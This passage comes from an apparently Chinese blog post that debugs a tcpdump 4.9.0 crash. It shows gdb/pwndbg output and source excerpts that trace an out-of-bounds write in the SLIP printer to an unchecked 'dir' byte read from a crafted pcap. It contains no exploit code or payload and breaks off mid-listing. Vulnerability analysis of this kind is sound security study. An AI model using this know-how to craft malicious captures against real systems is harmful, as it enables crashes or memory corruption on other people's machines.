</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@7fe409e06b06:~# gdb ./tcpdump-tcpdump-4.9.0/tcpdump -q
pwndbg: loaded <span class="m">164</span> commands. Type pwndbg <span class="o">[</span>filter<span class="o">]</span> <span class="k">for</span> a list.
pwndbg: created <span class="nv">$rebase</span>, <span class="nv">$ida</span> gdb functions <span class="o">(</span>can be used with print/break<span class="o">)</span>
Reading symbols from ./tcpdump-tcpdump-4.9.0/tcpdump...done.
pwndbg&gt; r -e -r ./slip-bad-direction.pcap 
Starting program: /root/tcpdump-tcpdump-4.9.0/tcpdump -e -r ./slip-bad-direction.pcap
reading from file ./slip-bad-direction.pcap, link-type SLIP <span class="o">(</span>SLIP<span class="o">)</span>

Program received signal SIGSEGV, Segmentation fault.
0x00000000004affb9 in compressed_sl_print <span class="o">(</span><span class="nv">ndo</span><span class="o">=</span>0x7fffffffd420, <span class="nv">chdr</span><span class="o">=</span>0x7ffff7fad011 <span class="s1">&#39;\347&#39;</span> &lt;repeats <span class="m">14</span> times&gt;, &lt;incomplete sequence <span class="se">\3</span><span class="m">47</span>&gt;..., <span class="nv">ip</span><span class="o">=</span>0x7ffff7fad020, <span class="nv">length</span><span class="o">=</span><span class="m">3890734886</span>, <span class="nv">dir</span><span class="o">=</span><span class="m">231</span><span class="o">)</span> at ./print-sl.c:253
<span class="m">253</span>		lastlen<span class="o">[</span>dir<span class="o">][</span>lastconn<span class="o">]</span> <span class="o">=</span> length - <span class="o">(</span>hlen <span class="s">&lt;&lt; 2);
</span><span class="s">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
</span><span class="s">──────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────
</span><span class="s"> RAX  0xe7e7
</span><span class="s"> RBX  0x7ffff7fad019 ◂— 0xe7e7e7e7e7e7e7e7
</span><span class="s"> RCX  0xe7
</span><span class="s"> RDX  0xe7e7e70a
</span><span class="s"> RDI  0x7ffff7b9062</span><span class="m">0</span> <span class="o">(</span>_IO_2_1_stdout_<span class="o">)</span> ◂— 0xfbad2a84
 RSI  0x0
 R8   0x0
 R9   0x6
 R10  0x0
 R11  0xfffffffffffffffe
 R12  0x7
 R13  0xe7e7e726
 R14  0xffffffff
 R15  0x4062df <span class="o">(</span>print_packet<span class="o">)</span> ◂— push   rbp
 RBP  0x7fffffffd170 —▸ 0x7fffffffd1c0 —▸ 0x7fffffffd210 —▸ 0x7fffffffd250 ◂— 0x7fffffffd280
 RSP  0x7fffffffd140 ◂— 0xe7e7e726000000e7
 RIP  0x4affb9 <span class="o">(</span>compressed_sl_print+534<span class="o">)</span> ◂— mov    dword ptr <span class="o">[</span>rax*4 + 0x877380<span class="o">]</span>, edx
───────────────────────────────────────────────────<span class="o">[</span> DISASM <span class="o">]</span>────────────────────────────────────────────────────
 ► 0x4affb9 &lt;compressed_sl_print+534&gt;    mov    dword ptr <span class="o">[</span>rax*4 + 0x877380<span class="o">]</span>, edx
   0x4affc0 &lt;compressed_sl_print+541&gt;    mov    rax, qword ptr <span class="o">[</span>rbp - 0x18<span class="o">]</span>
   0x4affc4 &lt;compressed_sl_print+545&gt;    mov    r8, qword ptr <span class="o">[</span>rax + 0x98<span class="o">]</span>
   0x4affcb &lt;compressed_sl_print+552&gt;    mov    rdx, rbx
   0x4affce &lt;compressed_sl_print+555&gt;    mov    rax, qword ptr <span class="o">[</span>rbp - 0x20<span class="o">]</span>
   0x4affd2 &lt;compressed_sl_print+559&gt;    mov    rcx, rdx
   0x4affd5 &lt;compressed_sl_print+562&gt;    sub    rcx, rax
   0x4affd8 &lt;compressed_sl_print+565&gt;    mov    eax, dword ptr <span class="o">[</span>rip + 0x281c12<span class="o">]</span> &lt;0x731bf0&gt;
   0x4affde &lt;compressed_sl_print+571&gt;    mov    edx, eax
   0x4affe0 &lt;compressed_sl_print+573&gt;    mov    eax, dword ptr <span class="o">[</span>rbp - 0x30<span class="o">]</span>
   0x4affe3 &lt;compressed_sl_print+576&gt;    cdqe   
────────────────────────────────────────────────<span class="o">[</span> SOURCE <span class="o">(</span>CODE<span class="o">)</span> <span class="o">]</span>────────────────────────────────────────────────
   <span class="m">248</span> 	 * <span class="s1">&#39;cp - chdr&#39;</span> is the length of the compressed header.
   <span class="m">249</span> 	 * <span class="s1">&#39;length - hlen&#39;</span> is the amount of data in the packet.
   <span class="m">250</span> 	 */
   <span class="m">251</span> 	<span class="nv">hlen</span> <span class="o">=</span> IP_HL<span class="o">(</span>ip<span class="o">)</span><span class="p">;</span>
   <span class="m">252</span> 	<span class="nv">hlen</span> <span class="o">+=</span> TH_OFF<span class="o">((</span>const struct tcphdr *<span class="o">)</span><span class="p">&amp;</span><span class="o">((</span>const int32_t *<span class="o">)</span>ip<span class="o">)[</span>hlen<span class="o">])</span><span class="p">;</span>
 ► <span class="m">253</span> 	lastlen<span class="o">[</span>dir<span class="o">][</span>lastconn<span class="o">]</span> <span class="o">=</span> length - <span class="o">(</span>hlen <span class="s">&lt;&lt; 2);
</span><span class="s">   2</span><span class="m">54</span> 	ND_PRINT<span class="o">((</span>ndo, <span class="s2">&#34; %d (%ld)&#34;</span>, lastlen<span class="o">[</span>dir<span class="o">][</span>lastconn<span class="o">]</span>, <span class="o">(</span>long<span class="o">)(</span>cp - chdr<span class="o">)))</span><span class="p">;</span>
   <span class="m">255</span> <span class="o">}</span>
────────────────────────────────────────────────────<span class="o">[</span> STACK <span class="o">]</span>────────────────────────────────────────────────────
<span class="m">00</span>:0000│ rsp  0x7fffffffd140 ◂— 0xe7e7e726000000e7
<span class="m">01</span>:0008│      0x7fffffffd148 —▸ 0x7ffff7fad020 ◂— 0xcae7e7e7e7e7e7
<span class="m">02</span>:0010│      0x7fffffffd150 —▸ 0x7ffff7fad011 ◂— 0xe7e7e7e7e7e7e7e7
<span class="m">03</span>:0018│      0x7fffffffd158 —▸ 0x7fffffffd420 ◂— 0x100000000
<span class="m">04</span>:0020│      0x7fffffffd160 —▸ 0x7ffff7fad010 ◂— 0xe7e7e7e7e7e7e7e7
<span class="m">05</span>:0028│      0x7fffffffd168 —▸ 0x7ffff7fad020 ◂— 0xcae7e7e7e7e7e7
<span class="m">06</span>:0030│ rbp  0x7fffffffd170 —▸ 0x7fffffffd1c0 —▸ 0x7fffffffd210 —▸ 0x7fffffffd250 ◂— 0x7fffffffd280
<span class="m">07</span>:0038│      0x7fffffffd178 —▸ 0x4afc58 <span class="o">(</span>sliplink_print+435<span class="o">)</span> ◂— mov    rax, qword ptr <span class="o">[</span>rbp - 0x38<span class="o">]</span>
Program received signal SIGSEGV <span class="o">(</span>fault address 0x8b131c<span class="o">)</span>
pwndbg&gt; </code></pre></td></tr></table>
</div>
</div>
<p>很容易看出，在 <code>print-sl.c</code> 的 253 行发生了地址不可读，此时的代码为 <code>► 253     lastlen[dir][lastconn] = length - (hlen &lt;&lt; 2);</code></p>

<p>看一下此时各个变量的值</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">p</span> <span class="err">/</span><span class="no">x</span> <span class="no">dir</span>
<span class="nf">$1</span> <span class="err">=</span> <span class="mi">0xe7</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">p</span> <span class="err">/</span><span class="no">x</span> <span class="no">lastconn</span>
<span class="nf">$2</span> <span class="err">=</span> <span class="mi">0xe7</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">p</span> <span class="err">/</span><span class="no">x</span> <span class="no">length</span>
<span class="nf">$3</span> <span class="err">=</span> <span class="mi">0xe7e7e726</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">p</span> <span class="err">/</span><span class="no">x</span> <span class="no">hlen</span>
<span class="nf">$4</span> <span class="err">=</span> <span class="mi">0x7</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">p</span> <span class="err">/</span><span class="no">x</span> <span class="no">lastlen</span>
<span class="nf">$5</span> <span class="err">=</span> <span class="err">{{</span><span class="mi">0x0</span> <span class="err">&lt;</span><span class="no">repeats</span> <span class="mi">256</span> <span class="no">times</span><span class="err">&gt;}</span><span class="p">,</span> <span class="err">{</span><span class="mi">0x0</span> <span class="err">&lt;</span><span class="no">repeats</span> <span class="mi">256</span> <span class="no">times</span><span class="err">&gt;}}</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">p</span>  <span class="err">&amp;</span><span class="no">lastlen</span>
<span class="nf">$6</span> <span class="err">=</span> <span class="p">(</span><span class="no">u_int</span> <span class="p">(*)[</span><span class="mi">2</span><span class="p">][</span><span class="mi">256</span><span class="p">])</span> <span class="mh">0x877380</span> <span class="p">&lt;</span><span class="no">lastlen</span><span class="p">&gt;</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">ptype</span> <span class="no">dir</span>
<span class="nf">type</span> <span class="err">=</span> <span class="no">int</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">bt</span>
<span class="c">#0  0x00000000004affb9 in compressed_sl_print (ndo=0x7fffffffd420, chdr=0x7ffff7fad011 &#39;\347&#39; &lt;repeats 14 times&gt;, &lt;incomplete sequence \347&gt;..., ip=0x7ffff7fad020, length=3890734886, dir=231) at ./print-sl.c:253
</span><span class="c">#1  0x00000000004afc58 in sliplink_print (ndo=0x7fffffffd420, p=0x7ffff7fad010 &#39;\347&#39; &lt;repeats 14 times&gt;, &lt;incomplete sequence \347&gt;..., ip=0x7ffff7fad020, length=3890734886) at ./print-sl.c:166
</span><span class="c">#2  0x00000000004af97e in sl_if_print (ndo=0x7fffffffd420, h=0x7fffffffd2b0, p=0x7ffff7fad010 &#39;\347&#39; &lt;repeats 14 times&gt;, &lt;incomplete sequence \347&gt;...) at ./print-sl.c:77
</span><span class="c">#3  0x000000000040a57a in pretty_print_packet (ndo=0x7fffffffd420, h=0x7fffffffd2b0, sp=0x7ffff7fad010 &#39;\347&#39; &lt;repeats 14 times&gt;, &lt;incomplete sequence \347&gt;..., packets_captured=1) at ./print.c:339
</span><span class="c">#4  0x000000000040632b in print_packet (user=0x7fffffffd420 &#34;&#34;, h=0x7fffffffd2b0, sp=0x7ffff7fad010 &#39;\347&#39; &lt;repeats 14 times&gt;, &lt;incomplete sequence \347&gt;...) at ./tcpdump.c:2501
</span><span class="c">#5  0x00007ffff7bb3ac4 in ?? () from /usr/lib/x86_64-linux-gnu/libpcap.so.0.8
</span><span class="c">#6  0x00007ffff7ba41cf in pcap_loop () from /usr/lib/x86_64-linux-gnu/libpcap.so.0.8
</span><span class="c">#7  0x000000000040582e in main (argc=4, argv=0x7fffffffe6f8) at ./tcpdump.c:2004
</span><span class="c">#8  0x00007ffff77eb830 in __libc_start_main (main=0x40414f &lt;main&gt;, argc=4, argv=0x7fffffffe6f8, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffe6e8) at ../csu/libc-start.c:291
</span><span class="c"></span><span class="err">#9</span>  <span class="err">0</span><span class="nf">x0000000000402b79</span> <span class="no">in</span> <span class="no">_start</span> <span class="p">()</span></code></pre></td></tr></table>
</div>
</div>
<blockquote>
<p>这里用的 gdb plugin 是我自己修改过的 <a href="https://github.com/bash-c/Pwngdb">Pwngdb</a>，就分析这个 CVE 而言，可以使用更轻量的 <a href="https://github.com/longld/peda">peda</a></p>

<p>如果不修改 CFLAGS 中的优化等级为 <code>-O0</code>， 在打印变量值时会显示 <code>&lt;value optimized out&gt;</code>，原因可以看 Reference</p>
</blockquote>

<p>计算一下很容易发现此时发生地址不可读是因为 <code>dir == 0xe7</code>，我们找到对应的源码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">   <span class="mi">205</span>	<span class="k">static</span> <span class="kt">void</span>
   <span class="mi">206</span>	<span class="nf">compressed_sl_print</span><span class="p">(</span><span class="n">netdissect_options</span> <span class="o">*</span><span class="n">ndo</span><span class="p">,</span>
   <span class="mi">207</span>	                    <span class="k">const</span> <span class="n">u_char</span> <span class="o">*</span><span class="n">chdr</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">ip</span> <span class="o">*</span><span class="n">ip</span><span class="p">,</span>
   <span class="mi">208</span>	                    <span class="n">u_int</span> <span class="n">length</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dir</span><span class="p">)</span>
   <span class="mi">209</span>	<span class="p">{</span>
			<span class="p">......</span>
			<span class="p">......</span>
   <span class="mi">245</span>	
   <span class="mi">246</span>		<span class="cm">/*
</span><span class="cm">   247		 * &#39;hlen&#39; is the length of the uncompressed TCP/IP header (in words).
</span><span class="cm">   248		 * &#39;cp - chdr&#39; is the length of the compressed header.
</span><span class="cm">   249		 * &#39;length - hlen&#39; is the amount of data in the packet.
</span><span class="cm">   250		 */</span>
   <span class="mi">251</span>		<span class="n">hlen</span> <span class="o">=</span> <span class="n">IP_HL</span><span class="p">(</span><span class="n">ip</span><span class="p">);</span>
   <span class="mi">252</span>		<span class="n">hlen</span> <span class="o">+=</span> <span class="n">TH_OFF</span><span class="p">((</span><span class="k">const</span> <span class="k">struct</span> <span class="n">tcphdr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="p">((</span><span class="k">const</span> <span class="n">int32_t</span> <span class="o">*</span><span class="p">)</span><span class="n">ip</span><span class="p">)[</span><span class="n">hlen</span><span class="p">]);</span>
   <span class="mi">253</span>		<span class="n">lastlen</span><span class="p">[</span><span class="n">dir</span><span class="p">][</span><span class="n">lastconn</span><span class="p">]</span> <span class="o">=</span> <span class="n">length</span> <span class="o">-</span> <span class="p">(</span><span class="n">hlen</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">);</span>
   <span class="mi">254</span>		<span class="n">ND_PRINT</span><span class="p">((</span><span class="n">ndo</span><span class="p">,</span> <span class="s">&#34; %d (%ld)&#34;</span><span class="p">,</span> <span class="n">lastlen</span><span class="p">[</span><span class="n">dir</span><span class="p">][</span><span class="n">lastconn</span><span class="p">],</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="n">cp</span> <span class="o">-</span> <span class="n">chdr</span><span class="p">)));</span>
   <span class="mi">255</span>	<span class="p">}</span></code></pre></td></tr></table>
</div>
</div>
<p>可以看出 dir 是 <code>compressed_sl_print()</code> 的参数，而根据调试时的 backtrace，<code>compressed_sl_print()</code> 调用时传递的 dir 即为 0xe7(231)，再继续找这个参数是何时传递的。</p>

<p>根据 backtrace，可以看出是在 <code>sliplink_print()</code> 中调用了 <code>compressed_sl_print()</code> 函数，查看对应的代码。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">   <span class="mi">125</span>	<span class="k">static</span> <span class="kt">void</span>
   <span class="mi">126</span>	<span class="nf">sliplink_print</span><span class="p">(</span><span class="n">netdissect_options</span> <span class="o">*</span><span class="n">ndo</span><span class="p">,</span>
   <span class="mi">127</span>	               <span class="k">register</span> <span class="k">const</span> <span class="n">u_char</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="k">register</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">ip</span> <span class="o">*</span><span class="n">ip</span><span class="p">,</span>
   <span class="mi">128</span>	               <span class="k">register</span> <span class="n">u_int</span> <span class="n">length</span><span class="p">)</span>
   <span class="mi">129</span>	<span class="p">{</span>
   <span class="mi">130</span>		<span class="kt">int</span> <span class="n">dir</span><span class="p">;</span>
   <span class="mi">131</span>		<span class="n">u_int</span> <span class="n">hlen</span><span class="p">;</span>
   <span class="mi">132</span>	
   <span class="mi">133</span>		<span class="n">dir</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="n">SLX_DIR</span><span class="p">];</span> <span class="c1">// bug here!!
</span><span class="c1"></span>   <span class="mi">134</span>		<span class="n">ND_PRINT</span><span class="p">((</span><span class="n">ndo</span><span class="p">,</span> <span class="n">dir</span> <span class="o">==</span> <span class="n">SLIPDIR_IN</span> <span class="o">?</span> <span class="s">&#34;I &#34;</span> <span class="o">:</span> <span class="s">&#34;O &#34;</span><span class="p">));</span>
   <span class="mi">135</span>	
   <span class="mi">136</span>		<span class="k">if</span> <span class="p">(</span><span class="n">ndo</span><span class="o">-&gt;</span><span class="n">ndo_nflag</span><span class="p">)</span> <span class="p">{</span>
   <span class="mi">137</span>			<span class="cm">/* XXX just dump the header */</span>
   <span class="mi">138</span>			<span class="k">register</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
   <span class="mi">139</span>	
   <span class="mi">140</span>			<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="n">SLX_CHDR</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">SLX_CHDR</span> <span class="o">+</span> <span class="n">CHDR_LEN</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
   <span class="mi">141</span>				<span class="n">ND_PRINT</span><span class="p">((</span><span class="n">ndo</span><span class="p">,</span> <span class="s">&#34;%02x.&#34;</span><span class="p">,</span> <span class="n">p</span><span class="p">[</span><span class="n">i</span><span class="p">]));</span>
   <span class="mi">142</span>			<span class="n">ND_PRINT</span><span class="p">((</span><span class="n">ndo</span><span class="p">,</span> <span class="s">&#34;%02x: &#34;</span><span class="p">,</span> <span class="n">p</span><span class="p">[</span><span class="n">SLX_CHDR</span> <span class="o">+</span> <span class="n">CHDR_LEN</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]));</span>
   <span class="mi">143</span>			<span class="k">return</span><span class="p">;</span>
   <span class="mi">144</span>		<span class="p">}</span>
   <span class="mi">145</span>		<span class="k">switch</span> <span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="n">SLX_CHDR</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xf0</span><span class="p">)</span> <span class="p">{</span>
   <span class="mi">146</span>	
   <span class="mi">147</span>		<span class="k">case</span> <span class="nl">TYPE_IP</span><span class="p">:</span>
   <span class="mi">148</span>			<span class="n">ND_PRINT</span><span class="p">((</span><span class="n">ndo</span><span class="p">,</span> <span class="s">&#34;ip %d: &#34;</span><span class="p">,</span> <span class="n">length</span> <span class="o">+</span> <span class="n">SLIP_HDRLEN</span><span class="p">));</span>
   <span class="mi">149</span>			<span class="k">break</span><span class="p">;</span>
   <span class="mi">150</span>	
   <span class="mi">151</span>		<span class="k">case</span> <span class="nl">TYPE_UNCOMPRESSED_TCP</span><span class="p">:</span>
   <span class="mi">152</span>			<span class="cm">/*
</span><span class="cm">   153			 * The connection id is stored in the IP protocol field.
</span><span class="cm">   154			 * Get it from the link layer since sl_uncompress_tcp()
</span><span class="cm">   155			 * has restored the IP header copy to IPPROTO_TCP.
</span><span class="cm">   156			 */</span>
   <span class="mi">157</span>			<span class="n">lastconn</span> <span class="o">=</span> <span class="p">((</span><span class="k">const</span> <span class="k">struct</span> <span class="n">ip</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">p</span><span class="p">[</span><span class="n">SLX_CHDR</span><span class="p">])</span><span class="o">-&gt;</span><span class="n">ip_p</span><span class="p">;</span>
   <span class="mi">158</span>			<span class="n">hlen</span> <span class="o">=</span> <span class="n">IP_HL</span><span class="p">(</span><span class="n">ip</span><span class="p">);</span>
   <span class="mi">159</span>			<span class="n">hlen</span> <span class="o">+=</span> <span class="n">TH_OFF</span><span class="p">((</span><span class="k">const</span> <span class="k">struct</span> <span class="n">tcphdr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="p">((</span><span class="k">const</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">ip</span><span class="p">)[</span><span class="n">hlen</span><span class="p">]);</span>
   <span class="mi">160</span>			<span class="n">lastlen</span><span class="p">[</span><span class="n">dir</span><span class="p">][</span><span class="n">lastconn</span><span class="p">]</span> <span class="o">=</span> <span class="n">length</span> <span class="o">-</span> <span class="p">(</span><span class="n">hlen</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">);</span>
   <span class="mi">161</span>			<span class="n">ND_PRINT</span><span class="p">((</span><span class="n">ndo</span><span class="p">,</span> <span class="s">&#34;utcp %d: &#34;</span><span class="p">,</span> <span class="n">lastconn</span><span class="p">));</span>
   <span class="mi">162</span>			<span class="k">break</span><span class="p">;</span>
   <span class="mi">163</span>	
   <span class="mi">164</span>		<span class="k">default</span><span class="o">:</span>
   <span class="mi">165</span>			<span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="n">SLX_CHDR</span><span class="p">]</span> <span class="o">&amp;</span> <span class="n">TYPE_COMPRESSED_TCP</span><span class="p">)</span> <span class="p">{</span>
   <span class="mi">166</span>				<span class="n">compressed_sl_print</span><span class="p">(</span><span class="n">ndo</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">p</span><span class="p">[</span><span class="n">SLX_CHDR</span><span class="p">],</span> <span class="n">ip</span><span class="p">,</span>
   <span class="mi">167</span>				    <span class="n">length</span><span class="p">,</span> <span class="n">dir</span><span class="p">);</span>
   <span class="mi">168</span>				<span class="n">ND_PRINT</span><span class="p">((</span><span class="n">ndo</span><span class="p">,</span> <span class="s">&#34;: &#34;</span><span class="p">));</span>
   <span class="mi">169</span>			<span class="p">}</span> <span class="k">else</span>
   <span class="mi">170</span>				<span class="n">ND_PRINT</span><span class="p">((</span><span class="n">ndo</span><span class="p">,</span> <span class="s">&#34;slip-%d!: &#34;</span><span class="p">,</span> <span class="n">p</span><span class="p">[</span><span class="n">SLX_CHDR</span><span class="p">]));</span>
   <span class="mi">171</span>		<span class="p">}</span>
   <span class="mi">172</span>	<span class="p">}</span></code></pre></td></tr></table>
</div>
</div>
<p>可以看出，dir 是在 133 行确定的，具体的代码为</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">   <span class="mi">133</span>		<span class="n">dir</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="n">SLX_DIR</span><span class="p">];</span> </code></pre></td></tr></table>
</div>
</div>
<p>其中，p 为 <code>sliplink_print()</code> 的参数，且在此时 p 为 <code>{0xe7, 0xe7, 0xe7, ...., 0xe7}</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="cp">#1  0x00000000004afc58 in sliplink_print (ndo=0x7fffffffd420, p=0x7ffff7fad010 &#39;\347&#39; &lt;repeats 14 times&gt;, &lt;incomplete sequence \347&gt;..., ip=0x7ffff7fad020, length=3890734886) at ./print-sl.c:166</span></code></pre></td></tr></table>
</div>
</div>
<p>且 <code>SLX_DIR</code> 为一个宏定义，其值为 <code>0</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">    <span class="mi">43</span>	<span class="cp">#define SLX_DIR 0</span></code></pre></td></tr></table>
</div>
</div>
<p>即 dir = 0xe7</p>

<p>而漏洞就出在接下来的 134 行了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">   <span class="mi">134</span>		<span class="nf">ND_PRINT</span><span class="p">((</span><span class="n">ndo</span><span class="p">,</span> <span class="n">dir</span> <span class="o">==</span> <span class="n">SLIPDIR_IN</span> <span class="o">?</span> <span class="s">&#34;I &#34;</span> <span class="o">:</span> <span class="s">&#34;O &#34;</span><span class="p">));</span>

   <span class="n">netdissect</span><span class="p">.</span><span class="nl">h</span><span class="p">:</span><span class="mi">327</span>
   <span class="cp">#define ND_PRINT(STUFF) (*ndo-&gt;ndo_printf)STUFF
</span><span class="cp"></span>
   <span class="n">netdissect</span><span class="p">.</span><span class="nl">h</span><span class="p">:</span><span class="mi">148</span>
   <span class="k">struct</span> <span class="n">netdissect_options</span> <span class="p">{</span>
	   <span class="p">......</span>
	
	  <span class="cm">/* pointer to function to do regular output */</span>
	  <span class="kt">int</span>  <span class="p">(</span><span class="o">*</span><span class="n">ndo_printf</span><span class="p">)(</span><span class="n">netdissect_options</span> <span class="o">*</span><span class="p">,</span>
			     <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fmt</span><span class="p">,</span> <span class="p">...)</span>
	  <span class="p">......</span>
	<span class="p">};</span></code></pre></td></tr></table>
</div>
</div>
<p>一串代码读下来，结果是通过一个函数指针把 dir 写到了 ndo 这个结构体里，而在判断 dir 类型时出了问题</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="n">dir</span> <span class="o">==</span> <span class="n">SLIPDIR_IN</span> <span class="o">?</span> <span class="s">&#34;I &#34;</span> <span class="o">:</span> <span class="s">&#34;O &#34;</span>

